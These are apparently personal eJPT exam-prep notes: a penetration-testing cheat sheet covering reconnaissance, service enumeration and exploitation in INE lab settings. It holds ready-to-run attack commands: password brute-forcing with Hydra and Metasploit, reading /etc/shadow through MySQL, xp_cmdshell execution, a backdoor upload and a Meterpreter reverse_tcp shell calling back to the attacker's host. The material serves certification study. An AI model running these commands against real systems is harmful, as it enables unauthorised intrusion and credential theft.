![[Pasted image 20251011144605.png]]






![[Pasted image 20251019211628.png]]


# Exam Tips:

- Group all questions together that relate to the same server and answer them before moving on 
- **Use the exclusion method** for Multi-choice questions. You know there’s only one right answer, so the other three must be wrong.
   - crucial to submit the flags as soon as you find it as they change after each reset.
   -  Make yourself familiar with Webdev platforms like "Drupal" and "Wordpress" and how to attack those.
	- Make sure to use WPSCAN
- There are 5–6 machines in DMZ and 1–2 machines in the internal network
- Just make sure you've completed the INE labs and maybe one or two machines to exploit WordPress and Drupal.
- Hydra is important, especially with Rockyou.
- For directory scanning use dirbuster not metasploit with /usr/share/wordlist/dirb/common.txt



Protip for those who are having trouble upgrading their Linux sessions in Metasploit to a meterpreter session: 

```
use post/multi/manage/shell_to_meterpreter
set PLATFORM_OVERRIDE linux
set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp
run
```




# Other Good Resources

https://www.notion.so/eJPTv2-Complete-Cheat-sheet-7a9012246bec4d37a9aa3a31f57934cc

https://github.com/jibranali142/eJPT-Exam-Resources/blob/main/eJPT%20Solution.pdf

https://github.com/xonoxitron/INE-eJPT-Certification-Exam-Notes-Cheat-Sheet

https://pjdeepakkumar.gitbook.io/ejptv2

- [**CrackStation**](https://crackstation.net/)
- [**CyberChef**](https://cyberchef.org/)
- [**GTFOBins**](https://gtfobins.github.io/)
- [**HackTricks**](https://book.hacktricks.xyz/)
- [**Hash Analyzer**](https://www.tunnelsup.com/hash-analyzer/)
- [**Nmap NSE Doc**](https://nmap.org/nsedoc/scripts/)
- [**PayLoadAllTheThing**s](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [**Reverse Shell Generator**](https://www.revshells.com/)
- [**Upgrade a Linux reverse shell to a fully usable TTY shell**](https://zweilosec.github.io/posts/upgrade-linux-shell/)


# TryHackMe Machines

### Enumeration

- [Enumeration](https://tryhackme.com/room/enumerationpe) (Linux & Windows) — **[PAID]**
- [Web Enumeration](https://tryhackme.com/room/webenumerationv2) (Web) — **[PAID]**
- [SimpleCTF](https://tryhackme.com/room/easyctf) (Linux)

### Windows Exploitation

- [Blue](https://tryhackme.com/room/blue)
- [Ice](https://tryhackme.com/room/ice)
- [Blaster](https://tryhackme.com/room/blaster)
- [Retro](https://tryhackme.com/room/retro)
- [Steel Mountain](https://tryhackme.com/room/steelmountain) — **[PAID]**
- [Relevant](https://tryhackme.com/room/relevant)

### Linux Exploitation

- [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)
- [Kenobi](https://tryhackme.com/room/kenobi)
- [Easy Peasy](https://tryhackme.com/room/easypeasyctf) (Hash cracking)
- [Sudo Agent](https://tryhackme.com/room/agentsudoctf) (Priv Esc)
- [RootMe](https://tryhackme.com/room/rrootme) (PrivEsc)
- [What the Shell?](https://tryhackme.com/room/introtoshells) (Shells and Reverse Shells) — **[PAID]**
- [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine) (Brute force)
- [Poster](https://tryhackme.com/room/poster) (PostgreSQL)
- [Chill Hack](https://tryhackme.com/room/chillhack) (SQLi)
- [SkyNet](https://tryhackme.com/room/skynet) (boot2root) — **[PAID]**
- [Startup](https://tryhackme.com/room/startup) (boot2root)
- [GamingServer](https://tryhackme.com/room/gamingserver) (boot2root)

### Privilege Escalation

- [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
- [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
- [Common Linux PrivEsc](https://tryhackme.com/room/commonlinuxprivesc) — **[PAID]**
- [Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
- [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20) — **[PAID]**

### Web & CMS

- [Ignite](https://tryhackme.com/room/ignite) (FuelCMS)
- [Blog](https://tryhackme.com/room/blog) (WordPress)
- [ColdBox: Easy](https://tryhackme.com/room/colddboxeasy) (WordPress)
- [Erit Securus I](https://tryhackme.com/room/eritsecurusi) (BoltCMS) — **[PAID]**
- [Bolt](https://tryhackme.com/room/bolt) (BoltCMS)
- [SQHell](https://tryhackme.com/room/sqhell) (SQLi)

### Pivoting

- [Wreath](https://tryhackme.com/room/wreath) (Windows)
- [Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting) (Windows) — **[PAID]**
- [VulnNet: Internal](https://tryhackme.com/room/vulnnetinternal) (Linux)




# Passive Information Gathering  

## Whois

```
whois <HOST>
whois <IP>
```
## Google Dorking

```
# Targeted site queries
site:target.com                                  # Limits search results to a specific site
site:*.target.com                                # Includes subdomains in search

# Admin panels and login pages
site:*.target.com inurl:login                    # Find login pages
site:*.target.com inurl:admin                    # Find admin pages
site:*.target.com intitle:admin                  # Pages with "admin" in title

# Directory listings / exposed files
site:*.target.com intitle:"index of"            # Directory listing pages
intitle:"index of" "credentials"                # Directories exposing credentials
site:*.target.com inurl:backup                   # Backup files or directories
site:*.target.com inurl:db                       # Database-related files
site:*.target.com inurl:config                   # Configuration files
site:*.target.com inurl:.git                     # Exposed git repositories
site:*.target.com inurl:.env                     # Exposed environment files

# Sensitive files by type
site:*.target.com filetype:pdf                   # PDF files
site:*.target.com filetype:docx                  # Word documents
site:*.target.com filetype:xlsx                  # Excel files
site:*.target.com filetype:sql                   # SQL database dumps
site:*.target.com filetype:log                   # Log files
site:*.target.com filetype:bak                   # Backup files
site:*.target.com filetype:zip                   # Compressed archives

# Passwords / authentication
site:*.target.com inurl:password                 # Password files
site:*.target.com inurl:auth_user_file.txt       # Exposed password directories

# Employees & internal information
site:*.target.com employees                       # Find employee info
site:*.target.com intitle:"staff"                # Staff pages
site:*.target.com intitle:"team"                 # Team pages

# Sitemap / hidden pages
inurl:"robots.txt"                                # Locate robots.txt for hidden pages
inurl:"sitemap.xml"                               # Sitemap info for site structure

# Misc useful searches
site:*.target.com "admin"                        # Pages mentioning "admin"
site:*.target.com "login"                        # Pages mentioning "login"
site:*.target.com "dashboard"                    # Pages with dashboards
site:*.target.com "contact"                      # Contact pages (sometimes lead to emails)
site:*.target.com "internal"                     # Look for internal info
site:*.target.com "confidential"                 # Search for confidential mentions
```

## Email Harvesting 

Using the Harvestor - attempted to use but not really any use.
```
theharvester -d target.com -b all                  # Harvest emails from all available sources
theharvester -d target.com -b linkedin             # Collect employees/emails from LinkedIn
theharvester -d target.com -b pgp                  # Search PGP key servers for emails
```
## Subdomain Enumeration 

This isn't 100% success as the domains might be unindexed etc. 

However still useful to gather information before actively engaging with the target.

https://github.com/aboul3la/Sublist3r

```
sublist3r -d hackersploit.org 
```

## Typical Sub Directories 

```
/robots.txt
/sitemap.xml
/admin/
/admin.php/
/admin.html/
/admin/login/
/login/
/login.php/
/login.html/
/administrator/
/administrator.php/
/administrator/login/
/adminpanel/
/adminpanel.php/
/controlpanel/
/cp/
/cpanel/
/dashboard/
/dashboard.php/
/useradmin/
/backend/
/manager/
/portal/
/wp-admin/
/administrator/
/user/login/
/admin123/
/phpmyadmin/
/pma/
```

## Website Fingerprinting 

The following two tools are browser extensions that can be used to fingerprint websites. The CLI versions of these can be considered active however. 
https://builtwith.com/
https://www.wappalyzer.com/
- **Extension = Passive**
- **CLI/API = Active**

# Active Information Gathering 

## Ping Sweep

Fping 
```
fping -a -g 10.10.23.0/24 2>/dev/null   # Fping is faster than a standard ping for a subnet sweep
```

Nmap
```
nmap -sn 192.168.1.1      # Pings all IPs within the subnet and shows only those that respond
```

Netdiscover
```
netdiscover -i eth0 -r 192.168.2.0/24
```


## Host Discovery 

Nmap
```
nmap -sn -v -T4 10.2.4.5   # Only tells you whether the host is up; does NOT scan ports; uses verbose and faster scanning flags
```

```
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 10.2.4.5   # Quick scan focusing on likely exploitable ports for the exam
```




## Banner Grabbing 

Netcat banner grab
Because some services cant be detected with NMAP ensure to use this 
```
nc 192.105.220.2 22   # Connects to port 22 and retrieves the banner (service/version info)
```

Nmap Banner Grab
```
nmap -sV --script=banner 192.8.94.3   # Uses Nmap service/version detection and banner script to get service info
```


## DNS Enumeration

DNS Dumpster - Tool that will finds subdomains, IPs, mail servers, and DNS records of a target domain.
https://dnsdumpster.com/

DNSrecon

```
dnsrecon -d hackersploit.org
```
## Directory Brute Force

Gobuster
```
# Basic directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt   # Scan directories

# Scan for specific file extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt   # Scan php, html, txt files

# Save results
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt   # Save to file
```

Dirbuster 

```
# Basic directory scan
dirb http://192.168.100.50 /usr/share/wordlists/dirb/common.txt   # Scan target.com using common wordlist

# Scan for specific file extensions
dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt   # Scan php, html, txt files

# Recursive scan (scan discovered directories)
dirb http://target.com /usr/share/wordlists/dirb/common.txt -r   # Recursively scan directories

# Save results to a file
dirb http://target.com /usr/share/wordlists/dirb/common.txt -o dirb_results.txt   # Save output to file
```


## WAF Detection


```
wafw00f hackersploit.org -a   # Detects Web Application Firewalls (WAFs)  "-a" tests for all possible WAF instances
```


## Active Subdomain

Sublister 

```
sublist3r -d target.com -b brute                  # Enable DNS brute force (active)
```

Amass

```
amass enum -active -d target.com                 # Active enumeration with brute force / DNS resolution
```


## DNS Zone Transfer 

Zone transfers may discover internal IP addresses 
You will often find that corporate networks will misconfigure networks and leak internal address space - which can be useful for targeting with malware

```
nmap --script=dns-zone-transfer -p 53 target.com   # Checks if port 53 allows zone transfer using Nmap script
```

```
fierce -dns zonetransfer.me                        # Attempts DNS zone transfer and subdomain enumeration
fierce --domain hackersploit.org                  # Another way to perform DNS reconnaissance with Fierce
```

 Give the domain name and then the nameserver of the site 
```
host -l zonetransfer.me nsztm.digi.ninja.        # Attempts zone transfer specifying the domain and its nameserver
```

Give the domain name and then the nameserver of the site
```
dig axfr @nsztm1.digi.ninja zonetransfer.me      # Performs zone transfer with dig; lists all DNS records without brute forcing 
```


## Port Scanning + Service Enumeration

## Common Ports

### TCP
| Port     | Service |
| -------- | ------- |
| 21       | FTP     |
| 22       | SSH     |
| 23       | Telnet  |
| 25       | SMTP    |
| 53       | DNS     |
| 80       | HTTP    |
| 110      | POP3    |
| 139, 445 | SMB     |
| 143      | IMAP    |
| 443      | HTTPS   |

### UDP
| Port | Service |
|------|---------|
| 53   | DNS     |
| 67   | DHCP    |
| 68   | DHCP    |
| 69   | TFTP    |
| 161  | SNMP    |

### Other Useful Ports
| Port | Service       |
|------|---------------|
| 1433 | MS SQL Server |
| 3389 | RDP           |
| 3306 | MySQL         |
## NMAP Port Scans 

Run everything Scan - This is an **active and noisy scan** — great for eJPT practice, but not stealthy in the real world.

Below Scan will just run default scripts
```
nmap -sS -A -p- -T4 -sC 192.145.12.4   # Stealth SYN scan, all ports, aggressive detection, and runs default (safe) scripts
```


Runs all scripts on the system - might be overkill so start with above
```
nmap -sS -A -p- -T4 --script=all 192.145.12.4   # Stealth SYN scan, all ports, aggressive detection, and runs ALL NSE scripts
```

Potentially even below is enough to scan most the needed ports
```
nmap -sS -sV -O -sC -T4 192.145.12.4 
```



UDP Scan ports 1-250
```
nmap demo.ine.local -p 1-250 -sU
```

UDP Service scan 
```
nmap demo.ine.local -p 134,177,234 -sUV
```

or 

```
nmap demo.ine.local -T4 -sU -p 161 -A
```
## Metasploit Port Scanning 

```
# Nmap inside MSF
db_nmap -Pn -sV -O <TARGET_IP>

hosts
services
vulns
loot
creds
notes
```

```
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS <TARGET_IP>
set PORTS 1-1000
run
```

```
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <TARGET_IP>
run
```


## SMB - 445

Typical port: 445

SMB Enumeration Using NMAP
```
# ----------------------
# SMB Enumeration with Nmap
# ----------------------

# General service detection on SMB
sudo nmap -p 445 -sV -sC -O <TARGET_IP>   # Detects service/version, runs default scripts, and attempts OS detection

# ----------------------
# SMB Protocol & Security Mode
# ---------------------
nmap -p 445 --script smb-protocols <TARGET_IP>          # Detects SMB protocol versions supported
nmap -p 445 --script smb-security-mode <TARGET_IP>      # Checks SMB security level (e.g., signing)

# ----------------------
# SMB Sessions
# ----------------------
nmap -p 445 --script smb-enum-sessions <TARGET_IP>                          # Enumerates SMB sessions (unauthenticated)
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # With credentials

# ----------------------
# SMB Shares
# ----------------------
nmap -p 445 --script smb-enum-shares <TARGET_IP>                            # Lists shares (unauthenticated)
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # With credentials
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # List files in shares

# ----------------------
# SMB Users
# ----------------------
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # Enumerates SMB users

# ----------------------
# SMB Domains, Groups & Services
# ----------------------
nmap -p 445 --script smb-enum-domains --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # Enumerates SMB domains
nmap -p 445 --script smb-enum-groups --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>    # Enumerates SMB groups
nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>  # Enumerates SMB services

# ----------------------
# SMB Server Info
# ----------------------
nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # SMB server statistics
nmap -p 445 --script smb-os-discovery <TARGET_IP>                                                    # SMB OS discovery

# ----------------------
# SMB Vulnerability Scan
# ----------------------
nmap -p 445 --script smb-vuln-* <TARGET_IP>   # Runs all SMB vulnerability check scripts


```

```
nmblookup -A <TARGET_IP>   # Enumerates NetBIOS names and services on the target (Windows host discovery)
```

Smbmap enumerate shares 
```
smbmap -u guest -p "" -d . -H <TARGET_IP>   # Attempt login with guest/anonymous access

smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>   # Login with valid credentials

smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'                          # Run a command on the target
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L                                     # List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'                                # List directory contents
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'   # Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'               # Download a file

```

SMB Client Connections
```
smbclient -L <TARGET_IP> -N                          # List shares (NULL/anonymous session)
smbclient -L <TARGET_IP> -U <USER>                   # List shares with authentication
smbclient //<TARGET_IP>/<USER> -U <USER>             # Connect to user share
or
smbclient//<Target_IP>//<SHARENAME>                  # Connect to anon share
smbclient //<TARGET_IP>/admin -U admin               # Connect to admin share
smbclient //<TARGET_IP>/public -N                    # Connect to public share (NULL session)

smbclient //<TARGET_IP>/share_name                   # Connect to a specific share
help                                                 # Show available commands
ls                                                   # List directory contents
get <filename>                                       # Download file from share
put <filename>                                       # Upload file to share
```


SMB Bruteforce with Hydra 
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
```

 Metasploit SMB Enumeration and Bruteforce
```
use auxiliary/scanner/smb/smb_version       # Detect SMB version on target
use auxiliary/scanner/smb/smb_enumusers     # Enumerate SMB users
use auxiliary/scanner/smb/smb_enumshares    # Enumerate SMB shares
use auxiliary/scanner/smb/smb_login         # Attempt SMB login brute-force
use auxiliary/scanner/smb/pipe_auditor      # Enumerate accessible named pipes

# set options depends on the selected module  for EJPT will be similar to target.ine.local
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
exploit
```


## FTP

```
sudo nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 -sV -O <TARGET_IP>

nmap -p 21 --script ftp-anon <TARGET_IP>
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

FTP  Brute Force
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
```

Metasploit 
```
# FTP Version Scan
use scanner/ftp/ftp_version
set RHOSTS 
run


# FTP Anon Login
use auxiliary/scanner/ftp/anonymous
set RHOSTS <TARGET_IP>
run

# FTP Brute force with metasploit
use auxiliary/scanner/ftp/ftp_login    
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
run
```

FTP Login
```
# FTP login
ftp <TARGET_IP>

## FTP client
ls
get <filename>
```

## SSH

Enumeration with NMAP
```
# NMAP
sudo nmap -p 22 -sV -sC -O <TARGET_IP>
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>
```

Enumeration with Metasploit 
```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers 


#for both ensure to set RHOSTS to correct target
set RHOSTS <TARGET_IP>

```

SSH Brute Force
```

use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```


Login vis SSH
```
ssh <USER>@<TARGET_IP> 22
ssh root@<TARGET_IP> 22
```

SSH Bruteforce with Hydra
```
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
```

## HTTP

NMAP Enumeration
```
sudo nmap -p 80 -sV -O <TARGET_IP> # Service & OS detection

nmap -p 80 --script=http-enum -sV <TARGET_IP>     # Enumerate common web apps/directories
nmap -p 80 --script=http-headers -sV <TARGET_IP>   # Display HTTP response headers

# Check for allowed HTTP methods (e.g., PUT, DELETE) in /webdav/
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>

```


HTTP Directory Bruteforce
```
dirb http://<TARGET_IP>
dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt
```


 Hydra - HTTP Brute Force
```
# HTTP Basic Auth
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/  
# Brute-force HTTP Basic authentication on /admin/

# HTTP Digest Auth
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/  
# Brute-force HTTP Digest authentication on /admin/

# HTTP POST Form - Basic
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form \
"/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"  
# Brute-force a login form with username admin; stops on "Not allowed" response

# HTTP POST Form - With Cookie
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form \
"/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"  
# Brute-force login form using a specific session cookie
```


HTTP Scanning and Brute force with metasploit 
```

use auxiliary/scanner/http/brute_dirs       # Brute-force directories on the webserver
use auxiliary/scanner/http/robots_txt       # Enumerate robots.txt for disallowed paths
use auxiliary/scanner/http/http_header      # Grab HTTP headers from the server
use auxiliary/scanner/http/http_login       # Perform HTTP login brute-force
use auxiliary/scanner/http/http_version     # Determine web server version

# Global set
setg RHOSTS <TARGET_IP>                     # Target host(s)
setg RHOST <TARGET_IP>                       # Target host


## set options depends on the selected module
set HTTP_METHOD GET                          # HTTP method to use (GET/POST)
set TARGETURI /<DIR>/                         # Target URI for the module
set USER_FILE <USERS_LIST>                   # Username list for login brute-force
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Password list
set VERBOSE false                             # Enable/disable verbose output
set AUTH_URI /<DIR>/                          # URI for authenticated login



exploit
```

## SQL

Enumeration with NMAP 
```
# Nmap - MySQL (MariaDB) Checks (port 3306)
# ----------------------

# Service/version and OS detection on MySQL
sudo nmap -p 3306 -sV -O <TARGET_IP>

# Stealth SYN scan, default scripts, service/version detection, and OS detection on MySQL (port 3306)
nmap -p 3306 -sS -sC -sV -O <TARGET_IP>

# Check for empty MySQL root/user passwords
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>

# Get MySQL server info
nmap -p 3306 --script=mysql-info <TARGET_IP>

# Enumerate MySQL users (requires credentials)
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

# List databases (requires credentials)
nmap -p 3306 --script=mysql-databases --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

# Dump server variables (requires credentials)
nmap -p 3306 --script=mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

# Run MySQL audit checks (requires credentials)
nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='<USER>',mysql-audit.password='<PW>',mysql-audit.filename=''" <TARGET_IP>

# Attempt to dump password hashes (requires credentials)
nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>

# Run an arbitrary query (requires credentials)
nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>

# ----------------------
# Nmap - Microsoft SQL (MSSQL) Checks (port 1433)
# ----------------------

# Basic service/version + default scripts on MSSQL
nmap -sV -sC -p 1433 <TARGET_IP>

# Get MSSQL server info
nmap -p 1433 --script=ms-sql-info <TARGET_IP>

# NTLM info from MSSQL (specify instance port if needed)
nmap -p 1433 --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>

# Check for empty MSSQL accounts
nmap -p 1433 --script=ms-sql-empty-password <TARGET_IP>

# Brute-force MSSQL logins using provided wordlists
nmap -p 1433 --script=ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <TARGET_IP>

# Run a query against MSSQL (requires creds) and save output
nmap -p 1433 --script=ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query="SELECT * FROM master..syslogins" <TARGET_IP> -oN output.txt

# Dump password hashes (requires creds)
nmap -p 1433 --script=ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PW> <TARGET_IP>

# Execute xp_cmdshell command (if enabled and creds available)
nmap -p 1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>

# Read a file via xp_cmdshell (if allowed)
nmap -p 1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>
```


Hydra SQL Brute force with username 
```
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql
```

MYSQL Connect to database 
```
# MYSQL
mysql -h <TARGET_IP> -u <USER>
mysql -h <TARGET_IP> -u root

# Mysql client
help
show databases;
use <DB_NAME>;
select count(*) from <TABLE_NAME>;
select load_file("/etc/shadow");
```

Metasploit enumeration for SQL
```
# Global
# ----------------------
# Set target host(s) globally
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

# ----------------------
# METASPLOIT - MySQL Modules
# ----------------------

# Dump MySQL schema information
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# Find writable directories for MySQL
use auxiliary/scanner/mysql/mysql_writable_dirs
set USERNAME <USER>
set PASSWORD <PW>
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE false

# Enumerate sensitive files accessible via MySQL
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME <USER>
set PASSWORD <PW>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set VERBOSE false

# Dump MySQL password hashes
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# MySQL login / brute forcing
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASSWORD ""
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE false

# ----------------------
# METASPLOIT - MSSQL Modules
# ----------------------

# MSSQL login / brute forcing
use auxiliary/scanner/mssql/mssql_login
set USERNAME <USER>
set PASSWORD <PW>
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE false

# General MSSQL enumeration (requires creds for full info)
use auxiliary/admin/mssql/mssql_enum
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# Enumerate MSSQL SQL logins
use auxiliary/admin/mssql/mssql_enum_sql_logins
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# Execute commands via MSSQL (xp_cmdshell)
use auxiliary/admin/mssql/mssql_exec
set USERNAME <USER>
set PASSWORD <PW>
set CMD whoami
set VERBOSE false

# Enumerate domain accounts via MSSQL
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false
```


## SMTP

```
sudo nmap -p 25 -sV -sC -O <TARGET_IP>
nmap -sV -script banner <TARGET_IP>
```


```
nc <TARGET_IP> 25
telnet <TARGET_IP> 25
```


```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
```

Metasploit SMTP Enuermation
```
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use auxiliary/scanner/smtp/smtp_enum
```

# Vulnerability Scanning 

Search for NMAP vulnerability scripts
```
ls -al /usr/share/nmap/scripts | grep vuln
```

```
ls -lah /usr/share/nmap/scripts | grep <KEYWORD>
```


# Exploitation 

## Search for Exploits - Searchsploit

https://www.exploit-db.com/

https://www.rapid7.com/db/?type=metasploit

```
searchsploit ssh
searchsploit remote windows smb
searchsploit remote windows buffer

searchsploit remote windows smb
searchsploit remote linux ssh
searchsploit remote linux ssh OpenSSH
searchsploit remote webapps wordpress
searchsploit local windows
searchsploit local windows | grep -e "Microsoft"

```

Copy exploit to path 
```
searchsploit -m /PATH
```
Display 
```
searchsploit -w vsftpd
```
## Search for Exploits - Metasploit


```
search type:exploit name:Microsoft IIS
search eternalblue 
search bluekeep
```


## Metasploit Commands

```
service postgresql start && msfconsole -q
```

```
db_status
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
workspace -a <SERVICE_NAME>
db_nmap -sS -sV -O <TARGET_IP>
# db_nmap -sS -sV -O -p- <TARGET_IP>

# For every exploit, check 'options' and 'info', setup accordingly
```
## Start Metasploit Database

```
service start postgresql 
sudo msfdb init
```
## Meterpreter Stored Data 
```
# List collected loot (files/artifacts)
loot
# Show help for loot
loot -h
# Show details for a loot item
loot
# Download loot item
loot download [path]
# Show DB connection status
db_status
# Export database to a file
db_export
# Run nmap and import results
db_nmap
# List hosts in DB
hosts
# List services in DB
services
# List recorded vulnerabilities
vulns
# Show captured credentials
creds
# List background jobs
jobs
# Verbose jobs (shows output files)
jobs -v
# Kill a job
jobs -k
```

## Meterpreter Shell Upgrade

With an already backgrounded session.
```
use post/multi/manage/shell_to_meterpreter
```

We will now need to configure the module options, more specifically, the LHOST and SESSION ID options, this can be done by running the following commands:

Make sure to replace LHOST with the IP address of your Kali machine.
```
set SESSION 1
set LHOST 192.212.191.2
run
```

Switch to meterpreter sessions
```
sessions
sessions 2
```

or quickest auto option 
```
sessions -u 
```

## Upgrade Shell Linux

spawning a bash session with python
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
spawning a bash session
```
/bin/bash -i
```

## Search for Flags

```
dir C:\Windows\System32\*.txt /s /b
```

Meterpreter Search
```
search -f flag*
```

## Shells

Spawn shells on comprimised
```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
/usr/bin/script -qc /bin/bash /dev/null
./'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```

```
# Install Netcat on Debian/Ubuntu (or upload nc.exe to target for Windows)
sudo apt update && sudo apt install -y netcat
# (Windows) upload nc.exe to the target if needed

# ----------------------
# Netcat - Basic Connect
# ----------------------
# Connect to a TCP port (simple)
nc <TARGET_IP> <TARGET_PORT>
# Connect with numeric-only host resolution and verbose output
nc -nv <TARGET_IP> <TARGET_PORT>
# UDP connect (numeric only)
nc -nvu <TARGET_IP> <TARGET_UDP_PORT>

# ----------------------
# Netcat - Listener
# ----------------------
# TCP listener on local port
nc -nvlp <LOCAL_PORT>
# UDP listener on local port
nc -nvlup <LOCAL_UDP_PORT>

# ----------------------
# Netcat - File Transfer
# ----------------------
# On the target (receiver) - listen and write incoming data to file
nc -nvlp <PORT> > test.txt
# On the attacker (sender) - send file contents to target
nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
```


```
